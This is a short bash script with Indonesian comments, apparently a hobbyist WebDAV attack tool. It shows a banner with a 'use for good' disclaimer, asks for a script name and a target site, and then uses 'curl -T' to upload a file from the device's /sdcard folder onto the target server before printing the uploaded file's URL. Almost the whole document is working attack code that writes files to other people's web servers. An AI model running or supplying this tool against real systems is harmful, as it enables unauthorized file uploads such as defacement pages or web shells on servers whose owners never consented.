#!usr/bin/bash
#coding sederhana kok di recode hahahaha
#Hargain gw yang udh buat :) jangan di recode mending buat sendiri :)
figlet -f slant WEBDAV 

echo  "============================================================" 
echo  "#  TYPE:         WEBDAV " 
echo  "# Author          ????? "
echo  "# remember !:        USING THIS TOOLS FOR GOOD NOT FOR EVIL " 
echo  "#            Be a good people " 
echo  "#             i Just a kid :) "
echo  "#======≠================================÷÷÷÷÷÷===============" 
sleep 1

echo  "${y} {1} ENTER THE SCRIPT NAME:"
read sc
echo
echo "]${y} {2} ENTER THE TARGET:"
read web
curl -T /sdcard/$sc $web
echo "${y} [Succes :)" $web/$sc 


